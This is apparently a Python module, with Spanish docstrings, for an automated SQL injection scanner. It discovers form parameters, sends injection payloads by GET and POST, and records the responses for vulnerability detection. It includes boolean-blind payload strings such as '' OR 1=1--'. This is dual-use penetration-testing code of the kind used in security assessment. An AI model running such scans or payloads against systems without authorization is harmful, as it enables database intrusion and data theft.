"""
Motor de Ataque Automatizado (Scanner)
Envía payloads SQL Injection y analiza respuestas del servidor.

Este módulo se encarga de realizar las peticiones HTTP con payloads SQL Injection,
descubrir parámetros de formularios, enviar payloads por GET y POST, y recopilar
las respuestas del servidor para su posterior análisis.
"""

import requests
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
import json

class SQLInjectionScanner:
    """
    Scanner automatizado para detectar vulnerabilidades SQL Injection.
    
    Esta clase gestiona las peticiones HTTP, envío de payloads, descubrimiento
    de parámetros de formularios HTML y recopilación de respuestas del servidor.
    Utiliza sesiones HTTP persistentes y maneja errores de conexión de forma
    robusta para realizar escaneos completos de endpoints.
    """
    
    def __init__(self, timeout: int = 10, cookies: Optional[Dict] = None, 
                 headers: Optional[Dict] = None, verify_ssl: bool = False):
        """
        Inicializa el scanner SQL Injection.
        
        Configura una sesión HTTP persistente con headers personalizados,
        cookies opcionales y opciones de verificación SSL. Establece headers
        por defecto apropiados para peticiones HTTP.
        
        Args:
            timeout (int): Timeout en segundos para las peticiones HTTP (default: 10)
            cookies (Optional[Dict]): Diccionario con cookies a usar en todas las peticiones
            headers (Optional[Dict]): Diccionario con headers HTTP personalizados
            verify_ssl (bool): Si es True, verifica certificados SSL (default: False)
        """
        self.timeout = timeout
        self.cookies = cookies or {}
        self.headers = headers or {}
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        
        default_headers = {
            'User-Agent': 'SQLi-Scanner/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        default_headers.update(self.headers)
        self.session.headers.update(default_headers)
        
        if self.cookies:
            self.session.cookies.update(self.cookies)
    
    def get_base_response(self, url: str, method: str = 'GET', 
                          params: Optional[Dict] = None, 
                          data: Optional[Dict] = None) -> Dict:
        """
        Obtiene la respuesta base del servidor sin payloads inyectados.
        
        Realiza una petición HTTP normal (GET o POST) al endpoint especificado
        para obtener la respuesta base que se utilizará como referencia para
        comparar con las respuestas que contienen payloads SQL Injection.
        
        Args:
            url (str): URL del endpoint a probar
            method (str): Método HTTP a usar ('GET' o 'POST', default: 'GET')
            params (Optional[Dict]): Parámetros para la petición GET (query string)
            data (Optional[Dict]): Datos para la petición POST (form data)
            
        Returns:
            Dict: Diccionario con la respuesta del servidor que contiene:
                - 'text': Cuerpo de la respuesta HTTP
                - 'status_code': Código de estado HTTP
                - 'headers': Diccionario con los headers de respuesta
                - 'time': Tiempo de respuesta en segundos
                - 'length': Longitud del cuerpo de la respuesta
                - 'url': URL final después de redirecciones
                - 'error': Mensaje de error si ocurrió algún problema
                - 'connection_error': True si hubo error de conexión
        """
        try:
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(url, data=data, json=None, timeout=self.timeout)
            
            elapsed_time = time.time() - start_time
            
            return {
                'text': response.text,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'time': elapsed_time,
                'length': len(response.text),
                'url': response.url
            }
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'error': str(e),
                'connection_error': True
            }
        except requests.exceptions.RequestException as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'error': str(e)
            }
        except Exception as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'error': f"Unexpected error: {str(e)}"
            }
    
    def check_connectivity(self, url: str) -> bool:
        """
        Verifica si el servidor está accesible antes de empezar el escaneo.
        
        Realiza una petición GET rápida al servidor para verificar que esté
        disponible y respondiendo antes de iniciar el escaneo completo.
        
        Args:
            url (str): URL del servidor a verificar
            
        Returns:
            bool: True si el servidor está accesible, False en caso contrario
        """
        try:
            response = self.session.get(url, timeout=5)
            return response.status_code > 0
        except:
            return False
    
    def inject_payload_get(self, url: str, param_name: str, payload: str,
                           forcedParams: Optional[List[str]]= None,
                           forcedValues: Optional[List[str]]= None) -> Dict:
        """
        Inyecta un payload SQL Injection en un parámetro GET y envía la petición.
        
        Construye una URL con el payload inyectado en el parámetro especificado,
        incluyendo parámetros forzados si se proporcionan, y realiza una petición
        GET para obtener la respuesta del servidor.
        
        Args:
            url (str): URL base del endpoint
            param_name (str): Nombre del parámetro donde inyectar el payload
            payload (str): Payload SQL Injection a inyectar
            forcedParams (Optional[List[str]]): Lista de nombres de parámetros forzados
            forcedValues (Optional[List[str]]): Lista de valores para los parámetros forzados
            
        Returns:
            Dict: Diccionario con la respuesta del servidor que contiene:
                - 'text': Cuerpo de la respuesta HTTP
                - 'status_code': Código de estado HTTP
                - 'headers': Diccionario con los headers de respuesta
                - 'time': Tiempo de respuesta en segundos
                - 'length': Longitud del cuerpo de la respuesta
                - 'url': URL final utilizada
                - 'payload': Payload que se inyectó
                - 'param': Nombre del parámetro donde se inyectó
                - 'error': Mensaje de error si ocurrió algún problema
                - 'connection_error': True si hubo error de conexión
        """
        try:
            parsed_url = urlparse(url)
            encoded_payload = quote(payload, safe="'\"-")
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"
            if forcedParams is not None:
                for i in range(len(forcedParams)):
                    target_url += f"{forcedParams[i]}={forcedValues[i]}&"

            target_url += f"{param_name}={encoded_payload}"

            start_time = time.time()
            response = self.session.get(target_url, timeout=self.timeout)
            elapsed_time = time.time() - start_time
            
            return {
                'text': response.text,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'time': elapsed_time,
                'length': len(response.text),
                'url': response.url,
                'payload': payload,
                'param': param_name
            }
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': str(e),
                'connection_error': True
            }
        except requests.exceptions.RequestException as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': str(e)
            }
        except Exception as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': f"Unexpected error: {str(e)}"
            }
    
    def inject_payload_post(self, url: str, data: Dict, param_name: str, 
                           payload: str,
                           forcedParams: Optional[List[str]]= None,
                           forcedValues: Optional[List[str]]= None) -> Dict:
        """
        Inyecta un payload SQL Injection en un parámetro POST y envía la petición.
        
        Crea una copia de los datos del formulario, inyecta el payload en el
        parámetro especificado, incluye parámetros forzados si se proporcionan,
        y realiza una petición POST para obtener la respuesta del servidor.
        
        Args:
            url (str): URL del endpoint
            data (Dict): Diccionario con los datos base del formulario
            param_name (str): Nombre del parámetro donde inyectar el payload
            payload (str): Payload SQL Injection a inyectar
            forcedParams (Optional[List[str]]): Lista de nombres de parámetros forzados
            forcedValues (Optional[List[str]]): Lista de valores para los parámetros forzados
            
        Returns:
            Dict: Diccionario con la respuesta del servidor (misma estructura que inject_payload_get)
        """
        try:
            test_data = data.copy()
            test_data[param_name] = payload
            if forcedParams is not None:
                for i in range(len(forcedParams)):
                    test_data[forcedParams[i]]=forcedValues[i]
            
            start_time = time.time()
            response = self.session.post(url, data=test_data, timeout=self.timeout)
            elapsed_time = time.time() - start_time
            
            return {
                'text': response.text,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'time': elapsed_time,
                'length': len(response.text),
                'url': response.url,
                'payload': payload,
                'param': param_name
            }
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': str(e),
                'connection_error': True
            }
        except requests.exceptions.RequestException as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': str(e)
            }
        except Exception as e:
            return {
                'text': '',
                'status_code': 0,
                'headers': {},
                'time': 0.0,
                'length': 0,
                'url': url,
                'payload': payload,
                'param': param_name,
                'error': f"Unexpected error: {str(e)}"
            }
    
    def discover_parameters(self, url: str, method: str = 'GET') -> List[str]:
        """
        Descubre parámetros de formularios HTML en la página.
        
        Analiza el HTML de la página para encontrar formularios y extraer
        los nombres de los campos de entrada (input, textarea, select) que
        pueden ser vulnerables a SQL Injection.
        
        Args:
            url (str): URL de la página a analizar
            method (str): Método HTTP (actualmente solo se usa GET para obtener la página)
            
        Returns:
            List[str]: Lista de nombres de parámetros encontrados en los formularios
        """
        params = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    name = inp.get('name')
                    if name and name not in params:
                        params.append(name)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            pass
        except Exception:
            pass
        
        return params
    
    def scan_endpoint(self, url: str, method: str = 'GET', 
                     params: Optional[List[str]] = None,
                     payloads: Optional[List[Dict]] = None,
                     forcedParams: Optional[List[str]]= None,
                     forcedValues: Optional[List[str]]= None) -> List[Dict]:
        """
        Escanea un endpoint completo probando todos los payloads en todos los parámetros.
        
        Realiza un escaneo exhaustivo del endpoint: descubre parámetros si no se
        proporcionan, obtiene la respuesta base, prueba cada payload en cada
        parámetro, y recopila todas las respuestas para su análisis. Incluye
        manejo especial para boolean-blind SQL Injection y control de errores
        de conexión.
        
        Args:
            url (str): URL del endpoint a escanear
            method (str): Método HTTP a usar ('GET' o 'POST', default: 'GET')
            params (Optional[List[str]]): Lista de nombres de parámetros a probar.
                Si es None, intenta descubrirlos automáticamente
            payloads (Optional[List[Dict]]): Lista de payloads a probar. Cada payload
                es un diccionario con 'payload', 'type', 'category'. Si es None,
                obtiene todos los payloads disponibles
            forcedParams (Optional[List[str]]): Lista de nombres de parámetros forzados
            forcedValues (Optional[List[str]]): Lista de valores para los parámetros forzados
            
        Returns:
            List[Dict]: Lista de diccionarios con todas las respuestas obtenidas.
                Cada diccionario contiene la respuesta HTTP más información del
                payload utilizado y la respuesta base para comparación
        """
        if payloads is None:
            from payloads import get_all_payloads
            payloads = get_all_payloads()
        
        results = []
        
        if params is None:
            params = self.discover_parameters(url, method)
        
        if not params:
            params = ['id', 'user', 'username', 'email', 'password', 'search', 
                     'q', 'query', 'name', 'value', 'buscar', 'empleado', 'nombre']
        
        base_data = {}
        if method.upper() == 'POST':
            for param in params:
                base_data[param] = 'test'
        
        base_params = {}
        if method.upper() == 'GET':
            for param in params:
                base_params[param] = '999999'
        
        base_response = self.get_base_response(url, method, 
                                               params=base_params if method == 'GET' else None,
                                               data=base_data if method == 'POST' else None)
        
        if base_response.get('connection_error'):
            print(f"  [!] Connection error: {base_response.get('error', 'Unknown error')}")
            print(f"  [!] Skipping scan for this endpoint due to connection issues")
            return []
        
        base_status = base_response.get('status_code', 0)
        base_length = base_response.get('length', 0)
        print(f"  [*] Base response: status={base_status}, length={base_length}")
        if base_length == 0:
            print(f"  [!] WARNING: Base response is empty! This may affect detection accuracy.")
        
        connection_errors = 0
        max_connection_errors = 5
        
        print(f"  [*] Testing {len(params)} parameters with {len(payloads)} payloads each...")
        
        boolean_true_payloads = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]
        boolean_false_payloads = ["' OR '1'='2", "' OR 1=2--", "' OR 'a'='b"]
        
        for param_idx, param in enumerate(params):
            print(f"  [+] Testing parameter {param_idx+1}/{len(params)}: {param} ({len(payloads)} payloads)")
            
            if any(p.get('type') == 'boolean_blind' for p in payloads):
                true_responses = []
                false_responses = []
                
                for true_payload in boolean_true_payloads:
                    try:
                        if method.upper() == 'GET':
                            true_resp = self.inject_payload_get(url, param, true_payload,forcedParams=forcedParams,forcedValues=forcedValues)
                        else:
                            true_resp = self.inject_payload_post(url, base_data, param, true_payload,forcedParams=forcedParams,forcedValues=forcedValues)
                        if not true_resp.get('connection_error'):
                            true_responses.append(true_resp)
                    except:
                        pass
                
                for false_payload in boolean_false_payloads:
                    try:
                        if method.upper() == 'GET':
                            false_resp = self.inject_payload_get(url, param, false_payload)
                        else:
                            false_resp = self.inject_payload_post(url, base_data, param, false_payload)
                        if not false_resp.get('connection_error'):
                            false_responses.append(false_resp)
                    except:
                        pass
                
                if true_responses and false_responses:
                    for true_resp in true_responses:
                        true_resp['payload_info'] = {'payload': true_resp.get('payload', ''), 'type': 'boolean_blind'}
                        true_resp['base_response'] = base_response
                        true_resp['is_boolean_test'] = True
                        true_resp['boolean_type'] = 'true'
                        results.append(true_resp)
                    
                    for false_resp in false_responses:
                        false_resp['payload_info'] = {'payload': false_resp.get('payload', ''), 'type': 'boolean_blind'}
                        false_resp['base_response'] = base_response
                        false_resp['is_boolean_test'] = True
                        false_resp['boolean_type'] = 'false'
                        results.append(false_resp)
            
            for idx, payload_info in enumerate(payloads):
                payload = payload_info['payload']
                
                try:
                    if method.upper() == 'GET':
                        test_response = self.inject_payload_get(url, param, payload, forcedParams=forcedParams, forcedValues=forcedValues)
                    else:
                        test_response = self.inject_payload_post(url, base_data, param, payload, forcedParams=forcedParams, forcedValues=forcedValues)
                    
                    if test_response.get('connection_error'):
                        connection_errors += 1
                        if connection_errors >= max_connection_errors:
                            print(f"  [!] Too many connection errors. Stopping scan for this endpoint.")
                            return results
                    
                    test_response['payload_info'] = payload_info
                    test_response['base_response'] = base_response
                    
                    results.append(test_response)
                    
                    if (idx + 1) % 10 == 0:
                        print(f"      Progress: {idx + 1}/{len(payloads)} payloads tested")
                    
                    time.sleep(0.1)
                    
                except KeyboardInterrupt:
                    print("\n  [!] Scan interrupted by user")
                    raise
                except Exception as e:
                    print(f"  [!] Error testing payload: {e}")
                    continue
        
        return results
    
    def scan_multiple_endpoints(self, base_url: str, endpoints: List[str],
                               method: str = 'GET', payloads: List[Dict] = None) -> Dict:
        """
        Escanea múltiples endpoints y recopila todos los resultados.
        
        Itera sobre una lista de endpoints, construye las URLs completas,
        escanea cada uno usando scan_endpoint, y organiza todos los resultados
        en un diccionario indexado por endpoint.
        
        Args:
            base_url (str): URL base a la que se añadirán los endpoints
            endpoints (List[str]): Lista de rutas de endpoints a escanear
            method (str): Método HTTP a usar ('GET' o 'POST', default: 'GET')
            payloads (Optional[List[Dict]]): Lista de payloads a probar.
                Si es None, usa todos los payloads disponibles
                
        Returns:
            Dict: Diccionario donde cada clave es un endpoint y el valor es
                un diccionario con 'url' y 'results' (lista de respuestas)
        """
        all_results = {}
        
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            print(f"\n[*] Scanning endpoint: {full_url}")
            
            results = self.scan_endpoint(full_url, method, payloads=payloads)
            all_results[endpoint] = {
                'url': full_url,
                'results': results
            }
        
        return all_results

